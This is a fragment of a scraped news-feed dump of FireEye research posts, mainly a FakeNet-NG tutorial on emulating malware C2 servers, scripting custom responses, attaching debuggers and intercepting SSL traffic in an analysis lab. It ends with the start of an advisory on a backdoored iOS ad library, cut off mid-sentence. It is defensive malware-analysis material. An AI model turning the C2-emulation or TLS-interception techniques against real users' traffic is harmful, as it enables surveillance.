Wilson","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Finding-your-web-history-data-Web-Historian-Left-vs.-Redline-Right-1024x435.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn88@2020_3/2020/08/24/14-11-04-879_04170322f426cd1f.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Configuring-Redline-to-Collect-Browser-History-Data-1024x560.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn93@2020_3/2020/08/24/14-11-16-934_2e331438e9e0a10e.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Displaying-your-web-history-data-for-review-in-both-Web-Historian-behind-and-Redline-front.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn68@2020_5/2020/08/24/14-11-17-602_87f590352a62530c.webp"},"publishedOrCreatedDate":1598278264207},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"FakeNet Genie: Improving Dynamic Malware Analysis with Cheat Codes for FakeNet-NG","link":"http://www.fireeye.com/blog/threat-research/2020/04/improving-dynamic-malware-analysis-with-cheat-codes-for-fakenet-ng.html","description":"<p>As developers of the network simulation tool FakeNet-NG, reverse engineers on the FireEye FLARE team, and malware analysis instructors, we get to see how different analysts use FakeNet-NG and the challenges they face. We have learned that FakeNet-NG provides many useful features and solutions of which our users are often unaware. In this blog post, we will showcase some cheat codes to level up your network analysis with FakeNet-NG. We will introduce custom responses and demonstrate powerful features such as executing commands on connection events and decrypting SSL traffic.</p> \n<p>Since its first <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/08/fakenet-ng_next_gen.html\">release in 2016</a>, we have improved <a href=\"https://github.com/fireeye/flare-fakenet-ng/releases\">FakeNet-NG</a> by adding new features such as <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/07/linux-support-for-fakenet-ng.html\">Linux support</a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/10/fakenet-content-based-protocol-detection.html\">content-based protocol detection</a>. We recently updated FakeNet-NG with one of our most requested features: custom responses for HTTP and binary protocols.</p> \n<p>This blog post offers seven \"stages\" to help you master different FakeNet-NG strategies. We present them in terms of common scenarios we encounter when analyzing malware. Feel free to skip to the section relevant to your current analysis and/or adapt them to your individual needs. The stages are presented as follows:</p> \n<ol> \n <li>Custom File Responses</li> \n <li>Custom Binary Protocols</li> \n <li>Custom HTTP Responses</li> \n <li>Manual Custom Responses</li> \n <li>Blacklisting Processes</li> \n <li>Executing Commands on Connection Events</li> \n <li>Decrypting SSL Traffic</li> \n</ol> \n<p>Read on to upgrade your skill tree and become a FakeNet-NG pro!</p> \n<h4>Before You Start: Configuring FakeNet-NG</h4> \n<p>Here is a quick reference for FakeNet-NG configurations and log data locations.</p> \n<ol> \n <li>Configuration files are in <span class=\"code\">fakenet\\configs</span>. You can modify <span class=\"code\">default.ini</span> or copy it to a new file and point FakeNet-NG to the alternate configuration with <span class=\"code\">-c</span>. Ex: <span class=\"code\">fakenet.py -c custom.ini.</span></li> \n <li>Default files are at <span class=\"code\">fakenet\\defaultFiles</span> and Listener implementations are at <span class=\"code\">fakenet\\listeners</span>.</li> \n <li>The <span class=\"code\">fakenet\\configs\\default.ini</span> default configuration includes global configuration settings and individual Listener configurations.</li> \n <li>Custom response configuration samples are included in the directory <span class=\"code\">fakenet\\configs</span> in the files <span class=\"code\">CustomProviderExample.py</span>, <span class=\"code\">sample_custom_response.ini</span>, and <span class=\"code\">sample_raw_response.txt</span>.</li> \n <li>The install location for FakeNet-NG in FLARE VM is <span class=\"code\">C:\\Python27\\lib\\site-packages\\fakenet</span>. You will find the subdirectories containing the <span class=\"code\">defaultFiles</span>, <span class=\"code\">configs</span>, and <span class=\"code\">listeners</span> in this directory.</li> \n <li>In FLARE VM, FakeNet-NG packet capture files and HTTP requests can be found on the Desktop in the <span class=\"code\">fakenet_logs</span> directory</li> \n</ol> \n<h4>Stage 1: Custom File Responses</h4> \n<p>As you may have noticed, FakeNet-NG is not limited to serving HTML pages. Depending on the file type requested, FakeNet-NG can serve PE files, ELF files, JPG, GIF, etc. FakeNet-NG is configured with several default files for common types and can also be configured to serve up custom files. The <span class=\"code\">defaultFiles</span> directory contains several types of files for standard responses. For example, if malware sends an FTP GET request for <span class=\"code\">evil.exe</span>, FakeNet-NG will respond with the file <span class=\"code\">defaultFiles\\FakeNetMini.exe</span> (the default response for .exe requests). This file is a valid Portable Executable file that displays a message box. By providing an actual PE file, we can observe the malware as it attempts to download and execute a malicious payload. An example FTP session and subsequent execution of the downloaded default file is shown in Figure 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Using FTP to download FakeNet-NG's default executable response</span></p> \n<p>Most requests are adequately handled by this system. However, malware sometimes expects a file with a specific format, such as an image with an embedded PowerShell script, or an executable with a hash appended to the file for an integrity check . In cases like these, you can replace one of the default files with a file that meets the malware’s expectation. There is also an option in each of the relevant Listeners (modules that implement network protocols) configurations to modify the <span class=\"code\">defaultFiles</span> path. This allows FakeNet-NG to serve different files without overwriting or modifying default data. A customized <span class=\"code\">FakeNet.html</span> <i> </i>file is shown in Figure 2.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: Modify the default FakeNet.html file to customize the response</span></p> \n<h4>Stage 2: Custom Binary Protocols</h4> \n<p>Many malware samples implement custom binary protocols which require specific byte sequences. For example, malware in the GH0ST family may require each message to begin with a signature such as \"GH0ST\". The default FakeNet-NG <span class=\"code\">RawListener</span> responds to unknown requests with an echo, i.e. it sends the same data that it has received. This behavior is typically sufficient. However, in cases where a custom response is required, you can still send the data the malware expects.</p> \n<p>Custom TCP and UDP responses are now possible with FakeNet-NG. Consider a hypothetical malware sample that beacons the string “Hello” to its command and control (C2) server and waits for a response packet that begins with “FLARE” followed by a numeric command (0-9). We will now demonstrate several interesting ways FakeNet-NG can handle this scenario.</p> \n<h5>Static Custom Response</h5> \n<p>You can configure how the TCP and/or UDP Raw Listeners respond to traffic. In this example we tell FakeNet-NG how to respond to any TCP raw request (no protocol detected). First uncomment the <span class=\"code\">Custom</span> configuration option in the <span class=\"code\">RawTCPListener</span> section of <span class=\"code\">fakenet/configs/default.ini</span> as illustrated in Figure 3.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[RawTCPListener]<br /> Enabled:&nbsp;&nbsp;&nbsp;&nbsp; True<br /> Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1337<br /> Protocol:&nbsp;&nbsp;&nbsp; TCP<br /> Listener:&nbsp;&nbsp;&nbsp; RawListener<br /> UseSSL:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No<br /> Timeout:&nbsp;&nbsp;&nbsp;&nbsp; 10<br /> Hidden:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; False<br /> # To read about customizing responses, see docs/CustomResponse.md<br /> <b>Custom:&nbsp;&nbsp;&nbsp; sample_custom_response.ini</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 3: Activate custom TCP response</span></p> \n<p>Next configure the <span class=\"code\">TcpRawFile</span> custom response in <span class=\"code\">fakenet\\configs\\sample_custom_response.ini</span> as demonstrated in Figure 4. Make sure to comment-out or replace the default <span class=\"code\">RawTCPListener</span> instance.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[ExampleTCP]<br /> InstanceName:&nbsp;&nbsp;&nbsp;&nbsp; RawTCPListener<br /> ListenerType:&nbsp;&nbsp;&nbsp;&nbsp; TCP<br /> TcpRawFile:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;flare_command.txt</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 4: TCP static custom response specifications</span></p> \n<p>Create the file <span class=\"code\">fakenet\\configs\\flare_command.txt</span> with the content <span class=\"code\">FLARE0</span>. TCP responses will now be generated from the contents of the file.</p> \n<h5>Dynamic Custom Response</h5> \n<p>Perhaps you want to issue commands dynamically rather than committing to a specific command in <span class=\"code\">flare_command.txt</span>. This can be achieved programmatically. Configure the <span class=\"code\">TcpDynamic</span> custom response in <span class=\"code\">fakenet\\configs\\sample_custom_response.ini</span> as demonstrated in Figure 5. Make sure to comment-out or replace the existing <span class=\"code\">RawTCPListener</span> instance.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[ExampleTCP]<br /> InstanceName:&nbsp;&nbsp;&nbsp;&nbsp; RawTCPListener<br /> TcpDynamic:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flare_command.py</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 5: TCP dynamic custom response specifications</span></p> \n<p>The file <span class=\"code\">fakenet\\configs\\CustomProviderExample.py</span> can be used as a template for our dynamic response file <span class=\"code\">flare_command.py</span>. We modify the <span class=\"code\">HandleTcp()</span> function and produce the new file <span class=\"code\">fakenet\\configs\\flare_command.py</span> as illustrated in Figure 6. Now you can choose each command as the malware executes. Figure 7 demonstrates issuing commands dynamically using this configuration.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p> <span class=\"code\">import socket</span></p> <p> <span class=\"code\">def HandleTcp(sock):</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp; while True:<br /> &nbsp; &nbsp; &nbsp; &nbsp; try:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data = None</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = sock.recv(1024)<br /> &nbsp; &nbsp; &nbsp; &nbsp; except socket.timeout:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pass</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if not data:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; resp = raw_input('\\nEnter a numeric command: ')<br /> &nbsp; &nbsp; &nbsp; &nbsp; command = bytes('FLARE' + resp + '\\n')<br /> &nbsp; &nbsp; &nbsp; &nbsp; sock.sendall(command)</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 6: TCP dynamic response script</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture7.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 7: Issue TCP dynamic commands</span></p> \n<h4>Stage 3: Custom HTTP Responses</h4> \n<p>Malware frequently implements its own encryption scheme on top of the popular HTTP protocol. For example, your sample may send an HTTP GET request to <span class=\"code\">/comm.php?nonce=&lt;random&gt;</span> and expect the C2 server response to be RC4 encrypted with the nonce value. This process is illustrated in Figure 8. How can we easily force the malware to execute its critical code path to observe or debug its behaviors?</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture8.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 8: Malware example that expects a specific key based on beacon data</span></p> \n<p>For cases like these we recently introduced support for HTTP custom responses. Like TCP custom responses, the <span class=\"code\">HTTPListener</span> also has a new setting named <span class=\"code\">Custom</span> that enables dynamic HTTP responses. This setting also allows FakeNet-NG to select the appropriate responses matching specific hosts or URIs. With this feature, we can now quickly write a small Python script to handle the HTTP traffic dynamically based upon our malware sample.</p> \n<p>Start by uncommenting the Custom configuration option in the <span class=\"code\">HTTPListener80</span> section as illustrated in Figure 9.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[HTTPListener80]<br /> Enabled:&nbsp;&nbsp;&nbsp;&nbsp; True<br /> Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 80<br /> Protocol:&nbsp;&nbsp;&nbsp; TCP<br /> Listener:&nbsp;&nbsp;&nbsp; HTTPListener<br /> UseSSL:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No<br /> Webroot:&nbsp;&nbsp;&nbsp;&nbsp; defaultFiles/<br /> Timeout:&nbsp;&nbsp;&nbsp;&nbsp; 10<br /> #ProcessBlackList: dmclient.exe, OneDrive.exe, svchost.exe, backgroundTaskHost.exe, GoogleUpdate.exe, chrome.exe<br /> DumpHTTPPosts: Yes<br /> DumpHTTPPostsFilePrefix: http<br /> Hidden:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; False<br /> # To read about customizing responses, see docs/CustomResponse.md<br /> <b>Custom:&nbsp;&nbsp;&nbsp; sample_custom_response.ini</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 9: HTTP Listener configuration</span></p> \n<p>Next configure the <span class=\"code\">HttpDynamic</span> custom response in <span class=\"code\">fakenet\\configs\\sample_custom_response.ini</span> as demonstrated in Figure 10. Make sure to comment-out or replace the default <span class=\"code\">HttpDynamic</span> instance.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[Example2]<br /> ListenerType:&nbsp;&nbsp;&nbsp;&nbsp; HTTP<br /> HttpURIs:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; comm.php<br /> HttpDynamic:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http_example.py</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 10: HttpDynamic configuration</span></p> \n<p>The file <span class=\"code\">fakenet\\configs\\CustomProviderExample.py</span> can be used as a template for our dynamic response file <span class=\"code\">http_example.py</span>. We modify the <span class=\"code\">HandleRequest()</span> function as illustrated in Figure 11. FakeNet-NG will now encrypt responses dynamically with the nonce.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p> <span class=\"code\">import socket<br /> from arc4 import ARC4</span></p> <p> <span class=\"code\"># To read about customizing HTTP responses, see docs/CustomResponse.md</span></p> <p> <span class=\"code\">def HandleRequest(req, method, post_data=None):<br /> &nbsp; &nbsp; \"\"\"Sample dynamic HTTP response handler.</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp; Parameters<br /> &nbsp; &nbsp; ----------<br /> &nbsp; &nbsp; req : BaseHTTPServer.BaseHTTPRequestHandler<br /> &nbsp; &nbsp; &nbsp; &nbsp; The BaseHTTPRequestHandler that recevied the request<br /> &nbsp; &nbsp; method: str<br /> &nbsp; &nbsp; &nbsp; &nbsp; The HTTP method, either 'HEAD', 'GET', 'POST' as of this writing<br /> &nbsp; &nbsp; post_data: str<br /> &nbsp; &nbsp; &nbsp; &nbsp; The HTTP post data received by calling `rfile.read()` against the<br /> &nbsp; &nbsp; &nbsp; &nbsp; BaseHTTPRequestHandler that received the request.<br /> &nbsp; &nbsp; \"\"\"</span></p> <p> <span class=\"code\">&nbsp;</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp; response = 'Ahoy\\r\\n'</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp; nonce = req.path.split('=')[1]<br /> &nbsp; &nbsp; arc4 = ARC4(nonce)<br /> &nbsp; &nbsp; response = arc4.encrypt(response)</span></p> <p> <span class=\"code\">&nbsp;&nbsp;&nbsp; req.send_response(200)<br /> &nbsp; &nbsp; req.send_header('Content-Length', len(response))<br /> &nbsp; &nbsp; req.end_headers()<br /> &nbsp; &nbsp; req.wfile.write(response)</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 11: Dynamic HTTP request handler</span></p> \n<h4>Stage 4: Manual Custom Responses</h4> \n<p>For even more flexibility, the all-powerful networking utility <span class=\"code\">netcat</span> can be used to stand-in for FakeNet-NG listeners. For example, you may want to use <span class=\"code\">netcat</span> to act as a C2 server and issue commands dynamically during execution on port 80. Launch a <span class=\"code\">netcat</span> listener before starting FakeNet-NG, and traffic destined for the corresponding port will be diverted to the <span class=\"code\">netcat</span> listener. You can then issue commands dynamically using the <span class=\"code\">netcat</span> interface as seen in Figure 12.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture12.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 12: Use ncat.exe to manually handle traffic</span></p> \n<p>FakeNet-NG's custom response capabilities are diverse. Read the <a href=\"https://github.com/fireeye/flare-fakenet-ng/blob/feature-tcp-custom-response/docs/CustomResponse.md\">documentation</a> to learn how to boost your custom response high score.</p> \n<h4>Stage 5: Blacklisting Processes</h4> \n<p>Some analysts prefer to debug malware from a separate system. There are many reasons to do this; most commonly to preserve the IDA database and other saved data when malware inevitably corrupts the environment. The process usually involves configuring two virtual machines on a host-only network. In this setup, FakeNet-NG intercepts network traffic between the two machines, which renders remote debugging impossible. To overcome this obstacle, we can blacklist the debug server by instructing FakeNet-NG to ignore traffic from the debug server process.</p> \n<p>When debugging remotely with IDA Pro, the standard debug server process for a 32-bit Portable Executable is <span class=\"code\">win32_remote.exe</span> (or <span class=\"code\">dbgsrv.exe</span> for WinDbg). All you need to do is add the process names to the <span class=\"code\">ProcessBlackList</span> configuration as demonstrated in Figure 13. Then, the debug servers can still communicate freely with IDA Pro while all other network traffic is captured and redirected by FakeNet-NG.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\"># Specify processes to ignore when diverting traffic. Windows example used here.<br /> ProcessBlackList: win32_remote.exe, dbgsrv.exe</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 13: Modified configs/default.ini to allow remote debugging with IDA Pro</span></p> \n<p>Blacklisting is also useful to filter out noisy processes from polluting Fakenet-NG captured network traffic. Examples include processes that attempt to update the Windows system or other malware analysis tools.</p> \n<p>Additional settings are available for blacklisting ports and hosts. Please see the <a href=\"https://github.com/fireeye/flare-fakenet-ng\">README</a> for more details about blacklisting and whitelisting.</p> \n<h4>Stage 6: Executing Commands on Connection Events</h4> \n<p>Fakenet-NG can be configured to execute commands when a connection is made to a Listener. For example, this option can be used to attach a debugger to a running sample upon a connection attempt. Imagine a scenario where we analyze the packed sample named <span class=\"code\">Lab18-01.exe</span> from the <a href=\"https://practicalmalwareanalysis.com/labs/\">Practical Malware Analysis labs</a>. Using dynamic analysis, we can see that the malware beacons to its C2 server over TCP port 80 using the HTTP protocol as seen in Figure 14.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture14.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 14: Malware beacons to its C2 server over TCP port 80</span></p> \n<p>Wouldn’t it be nice if we could magically attach a debugger to <span class=\"code\">Lab18-01.exe</span> when a connection is made? We could speedrun the sample and bypass the entire unpacking stub and any potential anti-debugging tricks the sample may employ.</p> \n<p>To configure Fakenet-NG to launch and attach a debugger to any process, modify the [<span class=\"code\">HTTPListener80</span>] section in the <span class=\"code\">fakenet\\configs\\default.ini</span> to include the <span class=\"code\">ExecuteCmd</span> option. Figure 15 shows an example of a complete [<span class=\"code\">HTTPListener80</span>] section.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[HTTPListener80]<br /> Enabled:&nbsp;&nbsp;&nbsp;&nbsp; True<br /> Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 80<br /> Protocol:&nbsp;&nbsp;&nbsp; TCP<br /> Listener:&nbsp;&nbsp;&nbsp; HTTPListener<br /> UseSSL:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No<br /> Webroot:&nbsp;&nbsp;&nbsp;&nbsp; defaultFiles/<br /> Timeout:&nbsp;&nbsp;&nbsp;&nbsp; 10<br /> DumpHTTPPosts: Yes<br /> DumpHTTPPostsFilePrefix: http<br /> Hidden:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; False<br /> # Execute x32dbg –p to attach to a debugger. {pid} is filled in automatically by Fakenet-NG<br /> <b>ExecuteCmd: x32dbg.exe -p {pid}</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 15: Execute command option to run and attach x32dbg</span></p> \n<p>In this example, we configure the <span class=\"code\">HTTPListener</span> on port 80 to execute the debugger <span class=\"code\">x32dbg.exe</span>, which will attach to a running process whose process ID is determined at runtime. When a connection is made to <span class=\"code\">HTTPListener</span>, FakeNet-NG will automatically replace the string <span class=\"code\">{pid}</span> with the process ID of the process that makes the connection. For a complete list of supported variables, please refer to the <a href=\"https://github.com/fireeye/flare-fakenet-ng/blob/master/fakenet/configs/default.ini\">Documentation</a>.</p> \n<p>Upon restarting Fakenet-NG and running the sample again, we see <span class=\"code\">x32dbg</span> launch and automatically attach to <span class=\"code\">Lab18-01.exe</span>. We can now use memory dumping tools such as <span class=\"code\">Scylla</span> or the <span class=\"code\">OllyDumpEx</span> plugin to dump the executable and proceed to static analysis. This is demonstrated in Figure 16 and Figure 17.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture16.gif\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 16: Using FakeNet-NG to attach x32dbg to the sample (animated)</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture17.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 17: Fakenet-NG executes x32dbg upon connection to practicalmalwareanalysis.com</span></p> \n<h4>Stage 7: Decrypting SSL Traffic</h4> \n<p>Often malware uses SSL for network communication, which hinders traffic analysis considerably as the packet data is encrypted. Using Fakenet-NG's <span class=\"code\">ProxyListener</span>, you can create a packet capture with decrypted traffic. This can be done using the protocol detection feature.</p> \n<p>The proxy can detect SSL, and \"man-in-the-middle\" the socket in SSL using Python's OpenSSL library. It then maintains full-duplex connections with the malware and with the HTTP Listener, with both sides unaware of the other. Consequently, there is a stream of cleartext HTTP traffic between the Proxy and the HTTP Listener, as seen in Figure 18.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture18.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 18: Cleartext streams between Fakenet-NG components</span></p> \n<p>In order to keep FakeNet-NG as simple as possible, current default settings for FakeNet-NG do not have the proxy intercept HTTPS traffic on port 443 and create the decrypted stream. To proxy the data you need to set the <span class=\"code\">HTTPListener443 Hidden</span> attribute to <span class=\"code\">True</span> as demonstrated in Figure 19. This tells the proxy to intercept packets and detect the protocol based on packet contents. Please <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/10/fakenet-content-based-protocol-detection.html\">read our blog post</a>&nbsp;on the proxy and protocol detection to learn more about this advanced feature.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">[HTTPListener443]<br /> Enabled:&nbsp;&nbsp;&nbsp;&nbsp; True<br /> Port:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;443<br /> Protocol:&nbsp;&nbsp;&nbsp; TCP<br /> Listener:&nbsp;&nbsp;&nbsp; HTTPListener<br /> UseSSL:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Yes<br /> Webroot:&nbsp;&nbsp;&nbsp;&nbsp; defaultFiles/<br /> DumpHTTPPosts: Yes<br /> DumpHTTPPostsFilePrefix: http<br /> <b>Hidden:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; True</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 19: Hide the listener so the traffic will be proxied</span></p> \n<p>We can now examine the packet capture produced by Fakenet-NG. The cleartext can be found in a TCP stream between an ephemeral port on localhost (<span class=\"code\">ProxyListener</span>) and port 80 on localhost (<span class=\"code\">HTTPListener</span>). This is demonstrated in Figure 20.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture20.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 20: Cleartext traffic between HTTPListener and Proxy Listener</span></p> \n<h4>Conclusion (New Game+)</h4> \n<p>Fakenet-NG is the de facto standard network simulation tool for malware analysis. It runs without installation and is included in FLARE VM. In addition to its proven and tested default settings, Fakenet offers countless capabilities and configuration options. In this blog post we have presented several tricks to handle common analysis scenarios. To download the latest version, to see a complete list of all configuration options, or to contribute to Fakenet-NG, please see our&nbsp;<a href=\"https://github.com/fireeye/flare-fakenet-ng\">Github repository</a>.</p>","descriptionType":"html","publishedDate":"Thu, 02 Apr 2020 15:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture1.png","linkMd5":"e8663eab08103ac5aaf0af8901259b03","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn23@2020_2/2020/08/24/14-11-06-415_868c2c0bf5868ae5.webp","destWidth":974,"destHeight":658,"sourceBytes":250454,"destBytes":57996,"author":"Matthew Haigh","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn23@2020_2/2020/08/24/14-11-06-415_868c2c0bf5868ae5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn4@2020_2/2020/08/24/14-11-08-898_24e63cacad1c8e70.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn31@2020_2/2020/08/24/14-11-12-004_97858e5abdda58a9.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture8.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn17@2020_6/2020/08/24/14-11-17-933_77253005715d4a57.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture12.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn79@2020_1/2020/08/24/14-11-08-647_e3f6bba2ed87f9cd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture14.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn31@2020_3/2020/08/24/14-11-18-208_fc78d21afb637cbd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture16.gif":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn63@2020_5/2020/08/24/14-11-29-286_64ce90c1f57e6bd7.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture17.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn32@2020_6/2020/08/24/14-11-16-162_f6c3e5cb9f8dfd78.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture18.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn45@2020_4/2020/08/24/14-11-14-964_b50575468810ce2a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture20.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn87@2020_6/2020/08/24/14-11-12-770_d628f09b1e61c2b6.webp"},"publishedOrCreatedDate":1598278264210},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"iBackDoor: High-Risk Code Hits iOS Apps","link":"http://www.fireeye.com/blog/threat-research/2015/11/ibackdoor_high-risk.html","description":"<h1> <span class=\"type-LL\">Introduction</span></h1> \n<p>FireEye mobile researchers recently discovered potentially “backdoored” versions of an ad library embedded in thousands of iOS apps originally published in the Apple App Store. The affected versions of this library embedded functionality in iOS apps that used the library to display ads, allowing for potential malicious access to sensitive user data and device functionality. NOTE: Apple has worked with us on the issue and has since removed the affected apps.</p> \n<p>These potential backdoors could have been controlled remotely by loading JavaScript code from a remote server to perform the following actions on an iOS device:</p> \n<ul> \n <li>Capture audio and screenshots</li> \n <li>Monitor and upload device location</li> \n <li>Read/delete/create/modify files in the app’s data container</li> \n <li>Read/write/reset the app’s keychain (e.g., app password storage)</li> \n <li>Post encrypted data to remote servers</li> \n <li>Open URL schemes to identify and launch other apps installed on the device</li> \n <li>“Side-load” non-App Store apps by prompting the user to click an “Install” button</li> \n</ul> \n<p>The offending ad library contained identifying data suggesting that it is a version of the mobiSage SDK [1]. We found 17 distinct versions of the potentially backdoored ad library: version codes 5.3.3 to 6.4.4. However, in the latest mobiSage SDK publicly released by adSage [2] – version 7.0.5 – the potential backdoors are not present. It is unclear whether the potentially backdoored versions of the ad library were released by adSage or if they were created and/or compromised by a malicious third party.</p> \n<p>As of November 4, we have identified 2,846 iOS apps containing the potentially backdoored versions of mobiSage SDK. Among these, we observed more than 900 attempts to contact an ad adSage server capable of delivering JavaScript code to control the backdoors. We notified Apple of the complete list of affected apps and technical details on October 21, 2015.</p> \n<p>While we have not observed the ad server deliver any malicious commands intended to 